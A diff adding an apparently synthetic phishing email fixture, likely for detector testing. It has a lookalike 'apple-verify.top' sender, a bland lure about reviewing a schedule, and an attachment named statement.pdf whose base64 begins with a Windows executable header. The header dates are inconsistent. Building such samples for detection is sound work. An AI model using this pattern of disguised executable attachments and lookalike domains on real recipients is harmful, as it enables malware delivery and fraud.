@@ -1,0 +1,47 @@
+From: notice@apple-verify.top
+To: victim1@example.com
+Subject: Meeting notes for the west power desk [ref A3779B1]
+Date: Tue, 22 Mar 2002 18:11:00 -0500
+Message-ID: <phish-1-f9942f57-ef9a-4ed8-b719-24453a9d0d50@apple-verify.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 15 Mar 2002 04:52:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 15 Mar 2002 13:17:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 05 Mar 2002 15:32:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 02 Mar 2002 21:20:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 03 Mar 2002 03:50:00 -0500
+Return-Path: <notice@apple-verify.top>
+Reply-To: notice@apple-verify.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-verify.top; dkim=pass header.d=apple-verify.top; dmarc=pass header.from=apple-verify.top
+Received-SPF: pass (mx.example.com: domain of notice@apple-verify.top designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-verify.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-1-60a44c7b"
+
+--bnd-p-1-60a44c7b
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A3779B1
+
+Thanks,
+Colleague
+--bnd-p-1-60a44c7b
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQACV7a1a7K2DY5H18Vm+rLacMFDoLhCghJZPYFNKXesMcJgzY8kq+XQAhdn3j1rHm2y7No3Sy
+Xi2cvjIIdz9egRIiiqQKRw5FmCiqG/BEXIr8gAkgA9yCTM46g3otDfwA4r8AwQPEId+PnCNIiYRV
+xNg7DU9e0I+FeYkqUieq61WLEHFGrX1uO1qy2475LZqVqqQVyj3DfVjXqSL0VXbsG7/ZjcJCazrw
+vG4TGwV/PLqHKxEY4Oa0AjH37TUpQVY5Hymgbn39OgU/1P9UWoqCbY4d2L3n4v2xV0wYINd7FDGF
+wyS6S3HzDM6MO1u9FPToZGtL6f6xcCB9zNHminXNgdHjkL6W11vi+X6ZGGvNuzp5BeNC42joJAvu
+BJ4YHq2IwtDTAag4Pado5L0+Oj/p6ZFPPU5HXHajzDSTLafOSINZz/8cpV/bWPBKBszpBCbdIiAI
+9AUzVHoOGhwA1oskDUTbqMOhzFWb2AtSijjLMCHt5e6fNFLfzya9zPPSX2W0zsBzoM1ITDu8wQkH
+KJPN42hL636RNwVP3rHK+e4nEhXiBlOTQp1Lyqgn+pAAtJNQbgiWYMM4xN1PkqwMNHGGC4wt/svb
++G34zu+TpYcxErO+Mteo9iIdKZ3IhMZi3HtiiMMJP7Bvxw5vGN5s9sHkZLmxlulSQBG6JPr2SvV2
+NKJe0UD+qSMQH2Un06AmLRoF70PPlcpHGNmLwubema1QX3wVpeerlw5f3uiAf3Nmioj4kKZNv6ee
+/T0LNsWfN7aZ55aoL9aeQSq7Enox2+l/iw3f304Gw/8MzqwO3eeFKafnDwtSZXJOOxVyJC/V5Et2
+9tdNe76FgyHLsEFswQ==
+
+--bnd-p-1-60a44c7b--
